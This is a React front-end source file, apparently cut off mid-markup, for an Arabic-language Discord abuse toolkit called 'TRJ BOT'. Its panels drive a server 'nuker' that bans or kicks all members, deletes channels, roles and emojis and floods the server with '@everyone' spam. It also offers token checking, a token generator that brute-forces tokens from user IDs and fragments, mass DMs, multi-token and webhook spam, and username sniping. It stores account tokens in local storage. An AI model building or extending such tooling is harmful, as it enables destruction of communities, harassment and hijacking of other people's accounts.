'use client'

import { useState, useEffect, useCallback, useRef } from 'react'

type Section = 'verify' | 'nuker' | 'copy' | 'spam' | 'leveling' | 'sniper' | 'checker' | 'multi-spam' | 'mass-dm' | 'leaver' | 'react' | 'webhook-spam' | 'voice-online' | 'server-info' | 'channel-clear' | 'token-generator' | 'webhook-creator' | 'server-backup'

interface Stats {
  deleted?: number; created?: number; spam_sent?: number; banned?: number; roles?: number
  txt?: number; voice?: number; cats?: number; sent?: number; failed?: number
  blocked?: number; left?: number; total?: number; emojis?: number; permissions?: number; kicked?: number
}

interface Result { username: string; status: string; color: string; debug?: string; method?: string }
interface VerifyInfo { type: string; name: string; id: string; email?: string; nitro?: string; verified?: string; createdAt?: string; flags?: number }
interface TokenCheckResult { token: string; valid: boolean; type: string; name: string; id: string; email?: string; nitro?: string; verified?: string; createdAt?: string; phone?: string; mfa?: string; error?: string }
interface GuildInfo { id: string; name: string; owner: boolean; members: number }

export default function Home() {
  const [section, setSection] = useState<Section>('verify')
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState('')
  const [stats, setStats] = useState<Stats | null>(null)
  const [verifyData, setVerifyData] = useState<VerifyInfo | null>(null)
  const [sniperResults, setSniperResults] = useState<Result[]>([])
  const [checkerResults, setCheckerResults] = useState<TokenCheckResult[]>([])
  const [checkerStats, setCheckerStats] = useState<{ total: number; valid: number; invalid: number; bots: number; users: number; nitro: number } | null>(null)
  const [progress, setProgress] = useState('')
  const [guildList, setGuildList] = useState<GuildInfo[]>([])
  const [extraData, setExtraData] = useState<any>(null)

  const [verifyToken, setVerifyToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_verify_token') || '' })
  const [nukerToken, setNukerToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_nuker_token') || '' })
  const [copyToken, setCopyToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_copy_token') || '' })
  const [spamToken, setSpamToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_spam_token') || '' })
  const [levelingToken, setLevelingToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_leveling_token') || '' })
  const [sniperToken, setSniperToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_sniper_token') || '' })
  const [checkerTokens, setCheckerTokens] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_checker_tokens') || '' })
  const [multiSpamTokens, setMultiSpamTokens] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_multi_tokens') || '' })
  const [massDmToken, setMassDmToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_dm_token') || '' })
  const [leaverToken, setLeaverToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_leaver_token') || '' })
  const [reactToken, setReactToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_react_token') || '' })
  const [whSpamToken, setWhSpamToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_whspam_token') || '' })

  const [guildId, setGuildId] = useState('')
  const [nukeMsg, setNukeMsg] = useState('@everyone NUKED BY TRJ BOT 💀🔥')
  const [nukeChannelName, setNukeChannelName] = useState('nuked-by-trj')
  const [nukeChannelCount, setNukeChannelCount] = useState(50)
  const [nukeMsgPerChannel, setNukeMsgPerChannel] = useState(5)
  const [nukeRenameCh, setNukeRenameCh] = useState('nuked')
  const [nukeSlowmode, setNukeSlowmode] = useState(0)

  const [sourceId, setSourceId] = useState('')
  const [targetId, setTargetId] = useState('')
  const [copyOptions, setCopyOptions] = useState({ roles: true, channels: true, settings: true })

  const [channelId, setChannelId] = useState('')
  const [messages, setMessages] = useState('')
  const [duration, setDuration] = useState(60)
  const [speed, setSpeed] = useState(0.3)

  const [levelingChannelId, setLevelingChannelId] = useState('')
  const [levelingDuration, setLevelingDuration] = useState(300)
  const [levelingSpeed, setLevelingSpeed] = useState(0.8)

  const [sniperMode, setSniperMode] = useState<'auto' | 'manual'>('auto')
  const [usernames, setUsernames] = useState('')
  const [sniperCount, setSniperCount] = useState(10)
  const [sniperLength, setSniperLength] = useState(4)
  const [useDot, setUseDot] = useState(false)
  const [useUnderscore, setUseUnderscore] = useState(false)
  // sniperPassword removed - not needed
  const [sniperAccountInfo, setSniperAccountInfo] = useState<any>(null)
  const [sniperStats, setSniperStats] = useState<any>(null)
  const [availableNames, setAvailableNames] = useState<string[]>([])
  const [sniperPattern, setSniperPattern] = useState('random')

  // Multi-Spam
  const [msChannelId, setMsChannelId] = useState('')
  const [msMessages, setMsMessages] = useState('')
  const [msDuration, setMsDuration] = useState(60)
  const [msSpeed, setMsSpeed] = useState(0.3)

  // Mass DM
  const [dmGuildId, setDmGuildId] = useState('')
  const [dmMessage, setDmMessage] = useState('')
  const [dmMaxMembers, setDmMaxMembers] = useState(100)

  // React
  const [reactChannelId, setReactChannelId] = useState('')
  const [reactEmoji, setReactEmoji] = useState('👍 ❤️ 🔥 🎉 💯')
  const [reactMessageId, setReactMessageId] = useState('')
  const [reactMode, setReactMode] = useState<'manual' | 'auto'>('manual')
  const [reactDuration, setReactDuration] = useState(60)

  // Webhook Spam
  const [whSpamUrl, setWhSpamUrl] = useState('')
  const [whSpamMessage, setWhSpamMessage] = useState('')
  const [whSpamCount, setWhSpamCount] = useState(50)
  const [whSpamUsername, setWhSpamUsername] = useState('')
  // Voice Online
  const [voiceToken, setVoiceToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_voice_token') || '' })
  const [voiceGuildId, setVoiceGuildId] = useState('')
  const [voiceChannelId, setVoiceChannelId] = useState('')
  const [voiceDuration, setVoiceDuration] = useState(86400)
  const [voiceActive, setVoiceActive] = useState(false)
  const [voiceSessionCount, setVoiceSessionCount] = useState(0)
  const [voiceRemaining, setVoiceRemaining] = useState('')
  const [showTokenGuide, setShowTokenGuide] = useState(false)
  const voiceTimerRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const voiceCountdownRef = useRef<ReturnType<typeof setInterval> | null>(null)
  // Server Info
  const [serverInfoToken, setServerInfoToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_serverinfo_token') || '' })
  const [serverInfoGuildId, setServerInfoGuildId] = useState('')
  // Channel Clear
  const [clearToken, setClearToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_clear_token') || '' })
  const [clearChannelId, setClearChannelId] = useState('')
  const [clearCount, setClearCount] = useState(100)
  // Token Generator
  const [tgMode, setTgMode] = useState<'random' | 'userid' | 'fragment'>('random')
  const [tgCount, setTgCount] = useState(10)
  const [tgUserId, setTgUserId] = useState('')
  const [tgHalfToken, setTgHalfToken] = useState('')
  const [tgFragment, setTgFragment] = useState('')
  const [tgFragmentAnalysis, setTgFragmentAnalysis] = useState<{hasPart1: boolean; hasPart2: boolean; hasPart3: boolean; partialPart1: boolean; partialPart2: boolean; partialPart3: boolean; part1: string; part2: string; part3: string; missingParts: string[]; analysis: string; detail: string; userIDs: string[]; timestamps: string[]; confidence: number} | null>(null)
  const [tgResults, setTgResults] = useState<{token: string; valid: boolean; info?: string; error?: string; index?: number; strategy?: number; size?: number; entropy?: number; isDemo?: boolean}[]>([])
  const [tgRunning, setTgRunning] = useState(false)
  const [tgStats, setTgStats] = useState<{total: number; checked: number; valid: number; invalid: number; skipped: number; speed: string} | null>(null)
  const tgAbortRef = useRef<AbortController | null>(null)
  // Webhook Creator - محسّن v2
  const [whCreateToken, setWhCreateToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_whcreate_token') || '' })
  const [whCreateGuildId, setWhCreateGuildId] = useState('')
  const [whCreateCount, setWhCreateCount] = useState(1)
  const [whCreateName, setWhCreateName] = useState('TRJ Webhook')
  const [whCreateResults, setWhCreateResults] = useState<{url: string; name: string; id: string; channelId?: string; channelName?: string}[]>([])
  const [whChannels, setWhChannels] = useState<{id: string; name: string; type: number; position: number}[]>([])
  const [whSelectedChannels, setWhSelectedChannels] = useState<string[]>([])
  const [whCreateMode, setWhCreateMode] = useState<'create' | 'spam' | 'existing'>('create')
  const [whCrSpamMessage, setWhCrSpamMessage] = useState('@everyone TRJ BOT')
  const [whCrSpamCount, setWhCrSpamCount] = useState(10)
  const [whCrSpamUsername, setWhCrSpamUsername] = useState('')
  const [whCrSpamAvatarUrl, setWhCrSpamAvatarUrl] = useState('')
  const [whEmbedEnabled, setWhEmbedEnabled] = useState(false)
  const [whEmbedTitle, setWhEmbedTitle] = useState('')
  const [whEmbedDesc, setWhEmbedDesc] = useState('')
  const [whEmbedColor, setWhEmbedColor] = useState('5865F2')
  const [whExistingUrls, setWhExistingUrls] = useState('')
  // Server Backup
  const [backupToken, setBackupToken] = useState(() => { if (typeof window === 'undefined') return ''; return localStorage.getItem('trj_backup_token') || '' })
  const [backupGuildId, setBackupGuildId] = useState('')
  const [restoreData, setRestoreData] = useState('')

  // Save to localStorage
  useEffect(() => { if (verifyToken) localStorage.setItem('trj_verify_token', verifyToken) }, [verifyToken])
  useEffect(() => { if (nukerToken) localStorage.setItem('trj_nuker_token', nukerToken) }, [nukerToken])
  useEffect(() => { if (copyToken) localStorage.setItem('trj_copy_token', copyToken) }, [copyToken])
  useEffect(() => { if (spamToken) localStorage.setItem('trj_spam_token', spamToken) }, [spamToken])
  useEffect(() => { if (levelingToken) localStorage.setItem('trj_leveling_token', levelingToken) }, [levelingToken])
  useEffect(() => { if (sniperToken) localStorage.setItem('trj_sniper_token', sniperToken) }, [sniperToken])
  useEffect(() => { if (checkerTokens) localStorage.setItem('trj_checker_tokens', checkerTokens) }, [checkerTokens])
  useEffect(() => { if (multiSpamTokens) localStorage.setItem('trj_multi_tokens', multiSpamTokens) }, [multiSpamTokens])
  useEffect(() => { if (massDmToken) localStorage.setItem('trj_dm_token', massDmToken) }, [massDmToken])
  useEffect(() => { if (leaverToken) localStorage.setItem('trj_leaver_token', leaverToken) }, [leaverToken])
  useEffect(() => { if (reactToken) localStorage.setItem('trj_react_token', reactToken) }, [reactToken])
  useEffect(() => { if (whSpamToken) localStorage.setItem('trj_whspam_token', whSpamToken) }, [whSpamToken])
  useEffect(() => { if (voiceToken) localStorage.setItem('trj_voice_token', voiceToken) }, [voiceToken])
  useEffect(() => { if (serverInfoToken) localStorage.setItem('trj_serverinfo_token', serverInfoToken) }, [serverInfoToken])
  useEffect(() => { if (clearToken) localStorage.setItem('trj_clear_token', clearToken) }, [clearToken])
  useEffect(() => { if (whCreateToken) localStorage.setItem('trj_whcreate_token', whCreateToken) }, [whCreateToken])
  useEffect(() => { if (backupToken) localStorage.setItem('trj_backup_token', backupToken) }, [backupToken])

  const genUsername = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    const special = (useDot ? '.' : '') + (useUnderscore ? '_' : '')
    const allChars = chars + special
    if (sniperPattern === 'consonants') { const cons = 'bcdfghjklmnpqrstvwxyz'; let u = cons[Math.floor(Math.random() * cons.length)]; for (let i = 1; i < sniperLength; i++) u += allChars[Math.floor(Math.random() * allChars.length)]; return u }
    if (sniperPattern === 'numbers') { let u = chars[Math.floor(Math.random() * 26)]; for (let i = 1; i < sniperLength; i++) u += chars[Math.floor(Math.random() * chars.length)]; return u }
    if (sniperPattern === 'dictionary') { const words = ['the','new','old','big','one','two','red','sun','sky','ice','fire','dark','cool','fast','top','zen','neo','pro','vex','lux','arc','sol','nox','pyx','zex','kai','ray','fox','owl','gem']; return words[Math.floor(Math.random() * words.length)] + String(Math.floor(Math.random() * 999)).padStart(3, '0') }
    if (sniperPattern === 'rare') { const p = [() => { const c = chars[Math.floor(Math.random()*26)]; return c+c+String(Math.floor(Math.random()*9999)).padStart(4,'0') }, () => { const c = chars[Math.floor(Math.random()*26)]; return c+String(Math.floor(Math.random()*99))+c+String(Math.floor(Math.random()*99)) }]; return p[Math.floor(Math.random()*p.length)]() }
    let u = chars[Math.floor(Math.random() * 26)]; for (let i = 1; i < sniperLength; i++) u += allChars[Math.floor(Math.random() * allChars.length)]; return u
  }

  const stopTgGeneration = useCallback(() => {
    if (tgAbortRef.current) { tgAbortRef.current.abort(); tgAbortRef.current = null }
    setTgRunning(false); setProgress('')
  }, [])

  const stopVoiceAnchor = useCallback(() => {
    if (voiceTimerRef.current) { clearInterval(voiceTimerRef.current); voiceTimerRef.current = null }
    if (voiceCountdownRef.current) { clearInterval(voiceCountdownRef.current); voiceCountdownRef.current = null }
    setVoiceActive(false); setVoiceSessionCount(0); setVoiceRemaining('')
  }, [])

  const clearState = useCallback(() => { stopTgGeneration(); stopVoiceAnchor(); setResult(''); setStats(null); setVerifyData(null); setSniperResults([]); setSniperAccountInfo(null); setSniperStats(null); setAvailableNames([]); setCheckerResults([]); setCheckerStats(null); setProgress(''); setGuildList([]); setExtraData(null); setTgResults([]); setTgHalfToken(''); setTgStats(null); setWhCreateResults([]); setWhChannels([]); setWhSelectedChannels([]); setTgFragment(''); setTgFragmentAnalysis(null) }, [stopTgGeneration, stopVoiceAnchor])

  // timeout مخصص حسب الـ endpoint: voice-online=30ث (يرجع فوراً), copy=5دق, nuker=5دق, الباقي=3دق
  const getTimeout = (ep: string) => {
    if (ep === 'voice-online') return 30000   // 30 ثانية
    if (ep === 'copy' || ep === 'nuker' || ep === 'server-backup') return 300000 // 5 دقائق
    return 180000 // 3 دقائق كافي للباقي
  }

  const api = async (endpoint: string, body: any, overrideTimeout?: number) => {
    setLoading(true); setResult(''); setStats(null); setSniperResults([]); setSniperAccountInfo(null); setSniperStats(null); setAvailableNames([]); setCheckerResults([]); setCheckerStats(null); setProgress('جاري التنفيذ...'); setGuildList([]); setExtraData(null)
    try {
      const payload = { ...body }
      const controller = new AbortController()
      const timeoutMs = overrideTimeout || getTimeout(endpoint)
      const timeoutId = setTimeout(() => controller.abort(), timeoutMs)
      const res = await fetch(`/api/${endpoint}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), signal: controller.signal })
      clearTimeout(timeoutId)
      const data = await res.json()
      if (data.success) {
        setResult('✅ تم بنجاح!')
        if (endpoint === 'sniper') { setSniperResults(data.results); if (data.stats) setSniperStats(data.stats); if (data.availableNames) setAvailableNames(data.availableNames); if (data.accountInfo) setSniperAccountInfo(data.accountInfo) }
        else if (endpoint === 'token-checker') { setCheckerResults(data.results); if (data.stats) setCheckerStats(data.stats) }
        else if (endpoint === 'leaver' && data.guilds) { setGuildList(data.guilds) }
        else if (endpoint === 'leaver' && data.servers) { setGuildList(data.servers.map((s: any) => ({ id: s.id, name: s.name, owner: s.name?.includes('owner'), members: 0 }))) }
        else if (endpoint === 'multi-spam' && data.stats?.tokenStats) { setExtraData(data.stats.tokenStats) }

        if (data.stats) setStats(data.stats)
        setLoading(false); setProgress(''); return data
      } else { setResult(`❌ ${data.error}`); setLoading(false); setProgress(''); return null }
    } catch (e) { 
      if (e instanceof Error && e.name === 'AbortError') setResult('❌ انتهى وقت الانتظار - حاول عدد أقل')
      else setResult('❌ خطأ في الاتصال')
      setLoading(false); setProgress(''); return null 
    }
  }

  const sections = [
    { id: 'verify' as Section, name: 'تحقق', icon: '🔑' },
    { id: 'nuker' as Section, name: 'نيوكر', icon: '💥' },
    { id: 'copy' as Section, name: 'نسخ', icon: '📋' },
    { id: 'spam' as Section, name: 'تسطير', icon: '⚡' },
    { id: 'leveling' as Section, name: 'تلفيل', icon: '📈' },
    { id: 'sniper' as Section, name: 'صيد', icon: '🎯' },
    { id: 'multi-spam' as Section, name: 'سبام متعدد', icon: '🔥' },
    { id: 'mass-dm' as Section, name: 'DM جماعي', icon: '📧' },
    { id: 'leaver' as Section, name: 'مغادرة', icon: '🚪' },
    { id: 'react' as Section, name: 'رياكشن', icon: '🎭' },
    { id: 'checker' as Section, name: 'فحص توكنات', icon: '🔍' },
    { id: 'webhook-spam' as Section, name: 'ويب هوك سبام', icon: '🔗' },
    { id: 'voice-online' as Section, name: 'تثبيت فويس', icon: '🎤' },
    { id: 'server-info' as Section, name: 'معلومات سيرفر', icon: '📊' },
    { id: 'channel-clear' as Section, name: 'مسح رسائل', icon: '🧹' },
    { id: 'token-generator' as Section, name: 'توليد توكنات', icon: '🎰' },
    { id: 'webhook-creator' as Section, name: 'إنشاء ويب هوك', icon: '🔗' },
    { id: 'server-backup' as Section, name: 'حفظ سيرفر', icon: '💾' },
  ]

  return (
    <div className="min-h-screen relative">
      <div className="bg-animated"><div className="bg-grid" /><div className="bg-orb bg-orb-1" /><div className="bg-orb bg-orb-2" /><div className="bg-orb bg-orb-3" /><div className="bg-lines"><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /><div className="bg-line" /></div></div>

      <header className="glass sticky top-0 z-50 border-b border-green-500/20 px-4 py-3">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <h1 className="text-xl font-bold text-green-400 flex items-center gap-2">
            <span className="text-2xl">🛡️</span>
            <span className="bg-gradient-to-r from-green-400 to-emerald-300 bg-clip-text text-transparent font-black text-2xl">TRJ BOT</span>
            <span className="text-xs text-green-600 bg-green-500/10 px-2 py-0.5 rounded-full border border-green-500/20 ml-1">v4.0</span>
          </h1>
          <div className="flex items-center gap-2">
            <button onClick={() => setShowTokenGuide(true)} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-3 py-1 rounded-full border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">🎫 كيف تجيب توكن</button>
            <span className="text-[10px] text-green-500 bg-green-500/10 px-3 py-1 rounded-full border border-green-500/20">⚡ 18 ميزة</span>
          </div>
        </div>
      </header>

      <div className="max-w-6xl mx-auto flex relative z-10">
        <aside className="w-64 min-h-screen glass-card p-3 hidden lg:block sticky top-[57px] self-start border-l border-green-500/10 overflow-auto max-h-[calc(100vh-57px)]">
          <div className="text-center mb-5 pb-4 border-b border-green-500/15"><div className="text-3xl mb-1">🛡️</div><h2 className="text-base font-black text-green-400">TRJ BOT</h2><p className="text-[10px] text-green-600 mt-0.5">v4.0 - محسّن و سريع</p></div>
          <nav className="space-y-1">
            {sections.map(s => (
              <button key={s.id} onClick={() => { setSection(s.id); clearState() }} className={`nav-item w-full flex items-center gap-2.5 px-3 py-2.5 rounded-xl transition-all duration-200 text-sm ${section === s.id ? 'active bg-green-500/15 text-green-400 border border-green-500/30 shadow-lg shadow-green-500/5' : 'text-green-600 hover:bg-green-500/8 hover:text-green-400 border border-transparent'}`}>
                <span className="text-lg">{s.icon}</span><span className="font-medium">{s.name}</span>
              </button>
            ))}
          </nav>
          <div className="mt-6 pt-3 border-t border-green-500/15 text-center"><p className="text-[10px] text-green-700">صنع بواسطة</p><p className="text-xs font-bold text-green-500">Discord: trj.py</p></div>
        </aside>

        <nav className="lg:hidden fixed bottom-0 left-0 right-0 glass border-t border-green-500/20 p-1.5 z-50">
          <div className="flex justify-around overflow-x-auto">
            {sections.slice(0, 6).map(s => (
              <button key={s.id} onClick={() => { setSection(s.id); clearState() }} className={`flex flex-col items-center p-1.5 rounded-xl transition-all min-w-[48px] ${section === s.id ? 'bg-green-500/20 text-green-400' : 'text-green-700'}`}>
                <span className="text-lg">{s.icon}</span><span className="text-[9px] mt-0.5">{s.name}</span>
              </button>
            ))}
          </div>
          <div className="flex justify-around mt-1.5 pt-1.5 border-t border-green-500/10 overflow-x-auto">
            {sections.slice(6).map(s => (
              <button key={s.id} onClick={() => { setSection(s.id); clearState() }} className={`flex flex-col items-center p-1.5 rounded-xl transition-all min-w-[48px] ${section === s.id ? 'bg-green-500/20 text-green-400' : 'text-green-700'}`}>
                <span className="text-lg">{s.icon}</span><span className="text-[9px] mt-0.5">{s.name}</span>
              </button>
            ))}
          </div>
        </nav>

        <main className="flex-1 p-4 lg:p-6 pb-28 lg:pb-8">
          <div className="max-w-2xl mx-auto">

            {loading && (<div className="mb-4 animate-fade-in"><div className="glass-card rounded-xl p-3 border border-green-500/20 flex items-center gap-3"><div className="trj-spinner" /><span className="text-sm text-green-400">{progress || '⏳ جاري التنفيذ...'}</span></div></div>)}

            {/* ==================== VERIFY ==================== */}
            {section === 'verify' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-green-500/20 shadow-xl shadow-green-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔑</span><h2 className="text-xl font-black text-green-400">تحقق من التوكن</h2></div>
                <p className="text-green-600 text-sm mb-5">تحقق من صلاحية أي توكن (بوت / يوزر) مع معلومات تفصيلية</p>
                <TokenInput label="🎫 التوكن" value={verifyToken} onChange={setVerifyToken} onHelp={() => setShowTokenGuide(true)} />
                <ActionBtn text="🔍 تحقق الآن" loading={loading} onClick={async () => { const data = await api('verify', { token: verifyToken }); if (data) setVerifyData({ type: data.type, name: data.name, id: data.id, email: data.email, nitro: data.nitro, verified: data.verified, createdAt: data.createdAt, flags: data.flags }) }} />
                {verifyData && (<div className="mt-5 bg-green-500/8 rounded-2xl p-6 border border-green-500/20 text-center animate-fade-in">
                  <div className="text-5xl mb-3">{verifyData.type === 'bot' ? '🤖' : '👤'}</div>
                  <div className="text-xl font-black text-green-400 mb-1">{verifyData.type === 'bot' ? 'بوت' : 'حساب يوزر'}</div>
                  <div className="text-green-300 text-lg font-medium">{verifyData.name}</div>
                  <div className="text-xs text-green-600 font-mono mt-2">{verifyData.id}</div>
                  <div className="grid grid-cols-2 gap-2 mt-4">{verifyData.email && <InfoPill label="البريد" value={verifyData.email} />}{verifyData.nitro && <InfoPill label="نيترو" value={verifyData.nitro} />}{verifyData.verified && <InfoPill label="الحالة" value={verifyData.verified} />}{verifyData.createdAt && <InfoPill label="التسجيل" value={verifyData.createdAt} />}</div>
                </div>)}
              </div></div>
            )}

            {/* ==================== NUKER ==================== */}
            {section === 'nuker' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border-2 border-red-500/30 shadow-xl shadow-red-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💥</span><h2 className="text-xl font-black text-red-400">نيوكر سيرفر</h2></div>
                <p className="text-red-500/60 text-sm mb-5">⚡ فائق السرعة - 50 روم بالتوازي + 100 حظر/طرد بالتوازي + كشف تلقائي للـ Rate Limit</p>
                <TokenInput label="🎫 التوكن" value={nukerToken} onChange={setNukerToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="📋 أيدي السيرفر" value={guildId} onChange={setGuildId} placeholder="Guild ID" accent="red" />
                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
                  <h3 className="text-xs font-bold text-red-400 mb-3 flex items-center gap-1.5">⚙️ خيارات</h3>
                  <div className="grid grid-cols-2 gap-3 mb-3">
                    <div><label className="text-[11px] text-red-300/70">اسم الرومات الجديدة</label><input type="text" value={nukeChannelName} onChange={e => setNukeChannelName(e.target.value)} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">تغيير اسم الرومات لـ</label><input type="text" value={nukeRenameCh} onChange={e => setNukeRenameCh(e.target.value)} placeholder="nuked" className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">عدد الرومات (max 500)</label><input type="number" value={nukeChannelCount} onChange={e => setNukeChannelCount(Math.min(Number(e.target.value), 500))} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">رسائل لكل روم</label><input type="number" value={nukeMsgPerChannel} onChange={e => setNukeMsgPerChannel(Number(e.target.value))} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">Slowmode (ثانية, 0=إيقاف)</label><input type="number" value={nukeSlowmode} onChange={e => setNukeSlowmode(Number(e.target.value))} min={0} max={21600} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                  </div>
                  <div><label className="text-[11px] text-red-300/70">💬 رسالة السبام</label><textarea value={nukeMsg} onChange={e => setNukeMsg(e.target.value)} rows={2} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 resize-none focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                </div>
                <div className="grid grid-cols-2 gap-2.5">
                  <NukerBtn text="💀 تدمير كامل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'destroy', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg, name: nukeChannelName })} />
                  <NukerBtn text="💥 نيوكر (رومات+سبام)" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'nuke', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg })} />
                  <NukerBtn text="🔨 حظر الكل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'banall' })} />
                  <NukerBtn text="👢 طرد الكل" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'kickall' })} />
                  <NukerBtn text="📢 سبام" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'spam', message: nukeMsg, msgPerChannel: nukeMsgPerChannel })} />
                  <NukerBtn text="🗑️ حذف الرومات" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_channels' })} />
                  <NukerBtn text="🗑️ حذف الرتب" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_roles' })} />
                  <NukerBtn text="🔤 تغيير أسماء الرومات" color="cyan" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'rename_channels', renameChannels: nukeRenameCh })} />
                  <NukerBtn text="🔤 تغيير اسم السيرفر" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'rename', name: nukeChannelName })} />
                  <NukerBtn text="🎭 إنشاء 50 رتبة" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_roles', createRolesCount: 50, rolesName: nukeRenameCh })} />
                  <NukerBtn text="🔢 عدد الرتب" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_roles', createRolesCount: Math.max(nukeChannelCount, 1), rolesName: nukeRenameCh })} />
                  <NukerBtn text="😀 حذف الإيموجي" color="yellow" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_emojis' })} />
                  <NukerBtn text="⏱️ تفعيل Slowmode" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'slowmode', slowmodeSeconds: nukeSlowmode || 21600 })} />
                  <NukerBtn text="📺 إنشاء رومات فقط" color="green" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_channels', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg })} />
                  <NukerBtn text="📁 إنشاء كاتيجوريات" color="green" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_categories', channelName: nukeChannelName, channelCount: nukeChannelCount })} />
                  <NukerBtn text="🔗 حذف الدعوات" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_invites' })} />
                </div>
              </div></div>
            )}

            {/* ==================== COPY ==================== */}
            {section === 'copy' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-green-500/20 shadow-xl shadow-green-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📋</span><h2 className="text-xl font-black text-green-400">نسخ سيرفر</h2></div>
                <p className="text-green-600 text-sm mb-5">نسخ سيرفر كامل بالتوازي - رتب + رومات + إعدادات + إيموجي + صلاحيات</p>
                <TokenInput label="🎫 التوكن" value={copyToken} onChange={setCopyToken} onHelp={() => setShowTokenGuide(true)} /><TextInput label="📥 أيدي المصدر" value={sourceId} onChange={setSourceId} placeholder="Source Guild ID" /><TextInput label="📤 أيدي الهدف" value={targetId} onChange={setTargetId} placeholder="Target Guild ID" />
                <div className="flex gap-3 mb-5 flex-wrap">{[{ key: 'roles' as const, label: '🎭 رتب' }, { key: 'channels' as const, label: '📺 رومات' }, { key: 'settings' as const, label: '⚙️ إعدادات' }].map(opt => (<label key={opt.key} className="flex items-center gap-2 text-xs text-green-300 bg-green-500/8 px-3 py-2 rounded-lg border border-green-500/15 cursor-pointer hover:bg-green-500/12 transition-colors"><input type="checkbox" checked={copyOptions[opt.key]} onChange={e => setCopyOptions({ ...copyOptions, [opt.key]: e.target.checked })} className="accent-green-500 w-3.5 h-3.5" />{opt.label}</label>))}</div>
                <ActionBtn text="📋 بدء النسخ" loading={loading} onClick={() => api('copy', { token: copyToken, sourceId, targetId, options: copyOptions })} />
              </div></div>
            )}

            {/* ==================== SPAM ==================== */}
            {section === 'spam' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-orange-500/20 shadow-xl shadow-orange-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">⚡</span><h2 className="text-xl font-black text-orange-400">تسطير - ماكرو</h2></div>
                <p className="text-orange-500/60 text-sm mb-5">إرسال 5 رسائل بالتوازي - أسرع بمرتين!</p>
